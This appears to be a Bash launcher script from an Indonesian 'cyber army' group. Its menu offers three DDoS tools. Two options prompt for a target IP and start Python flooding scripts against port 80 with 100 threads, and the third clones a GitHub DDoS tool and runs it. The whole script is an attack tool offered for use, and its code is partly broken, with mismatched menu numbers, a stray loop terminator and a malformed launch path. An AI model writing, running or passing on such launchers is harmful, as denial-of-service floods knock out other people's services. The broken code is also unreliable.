

figlet TCA_TEAM TOOLS DDOS | lolcat

echo "_____________________________________________________________"
echo "Tools   : TOOLS DDOS ATTACK     $white                       " | lolcat
echo "Creadby : ⇝͜͡✪♆•|Mr.CpbxXx|•❻⓺❻♆✪࿐*                            " | lolcat
echo "Team    : TANGERANG CYBER ARMY TEAM ( TCA )                  " | lolcat
echo "Contact : +62 857-7908-1663   $white                         " | lolcat
echo "Message : Pantang pulang sebelum musuh tumbang :)            " | lolcat
echo "_____________________________________________________________"
                                                                              
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
echo $cyan"[#]> Thanks"
sleep 1
echo ""
echo $white"[#]> see you again guys :)"
sleep 1
exit
}

lagi=1
while [ $lagi -lt 4 ];
do
echo ""
echo $b "1.DDOS TROJAN${enda}";
echo "============================" | lolcat
echo $r "2.DDOS DROID${endc}";
echo "============================" | lolcat
echo $g "3.DDOS GREENREAPER${endc}";
echo "============================" | lolcat
echo $r "4.Exit${endc}";
echo ""
echo "╭─⇝͜͡✪♆•|Mr.CpbxXx|•❻⓺❻♆✪࿐" | lolcat
read -p "╰─#" pil;
                          
# DDOS TROJAN

case $pil in
1) figlet TOOLS DDOS TROJAN | lolcat
echo "${y} {1} MASUKAN IP TARGET${endc}:"
read -p "===>" ipt
clear
echo
python win.32.64.NT.py -s$ipt -p80 -t100

;;

# DDOS DROID

2) figlet TOOLS DDOS DROID | lolcat
echo "${y} {1} MASUKAN IP TARGET${endc}:"
read -p "===>" ipt
clear
echo
python andromeda.py -s$ipt -p80 -t100

;;

# DDOS GREENREAPER

3) git clone https://github.com/Amriez/GreenReaper
echo -e "${y} Installer GreenReaper..."
echo -e "${y} cd GreenReaper"
echo -e "${y} python2 greenreaper.py"
cd /data/data/com.termux/files/home/GreenReaper/
python2 /data/data/com.termux/files/home/GreenReaper/ greenreaper.py

;;


6) echo "created by : ⇝͜͡✪♆•|Mr.CpbxXx|•❻⓺❻♆✪࿐*" | lolcat
exit
;;

*) echo "sorry, pilihan yang kamu cari tidak tersedia"
esac
done
done

